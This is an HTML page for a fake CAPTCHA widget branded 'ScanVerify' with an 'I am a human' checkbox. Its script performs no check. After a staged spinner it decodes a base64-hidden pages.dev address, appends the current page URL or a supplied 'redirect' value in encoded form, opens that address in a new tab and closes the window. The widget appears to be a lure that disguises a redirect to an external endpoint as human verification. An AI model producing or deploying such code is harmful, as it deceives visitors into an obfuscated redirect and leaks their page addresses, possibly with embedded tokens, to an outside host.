<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ScanVerify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/feather-icons"></script>
    <style>
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2563eb;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        .next-icon {
            display: none;
            width: 18px;
            height: 18px;
            color: #2563eb;
        }
        body {
            background: transparent;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div id="captcha-box" class="w-[304px] h-[78px] bg-white border border-gray-300 rounded-lg flex items-center px-3 shadow-sm select-none cursor-pointer hover:border-gray-400 transition-all">
        <div class="flex items-center flex-grow">
            <div id="checkbox-container" class="relative w-[28px] h-[28px] bg-white border-2 border-gray-300 rounded-[4px] flex items-center justify-center">
                <div id="spinner" class="spinner hidden"></div>
                <i id="next-icon" data-feather="external-link" class="next-icon"></i>
            </div>
            <span class="ml-3 text-[14px] font-medium text-gray-700">I am a human</span>
        </div>
        <div class="flex flex-col items-center justify-center">
            <div class="bg-blue-600 p-1.5 rounded-lg mb-0.5">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-shield text-white w-4 h-4">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                </svg>
            </div>
            <span class="text-[10px] font-bold text-gray-800 tracking-tight">ScanVerify</span>
        </div>
    </div>
    <script>
        feather.replace();
        const captchaBox = document.getElementById('captcha-box');
        const spinner = document.getElementById('spinner');
        const nextIcon = document.getElementById('next-icon');
        const checkboxContainer = document.getElementById('checkbox-container');
        let isVerified = false;

        const getRedirectUrl = () => {
            const urlParams = new URLSearchParams(window.location.search);
            const customRedirect = urlParams.get('redirect');
            const encodedBase = "aHR0cHM6Ly9zY2FudmVyaWZ5LWVuZHBvaW50LnBhZ2VzLmRldi8/cGFnZT0=";
            const baseUrl = atob(encodedBase);
            
            let dataToEncode = customRedirect || window.location.href;
            let gibberishParam = btoa(dataToEncode);
            
            return baseUrl + encodeURIComponent(gibberishParam);
        };

        captchaBox.addEventListener('click', () => {
            if (isVerified) return;
            spinner.classList.remove('hidden');
            checkboxContainer.classList.add('border-transparent');
            setTimeout(() => {
                spinner.classList.add('hidden');
                nextIcon.style.display = 'block';
                checkboxContainer.classList.remove('border-transparent');
                checkboxContainer.classList.add('border-blue-200');
                isVerified = true;
                captchaBox.style.cursor = 'default';
                
                setTimeout(() => {
                    const target = getRedirectUrl();
                    window.open(target, '_blank');
                    window.close();
                }, 800);
            }, 1500);
        });
    </script>
</body>
</html>
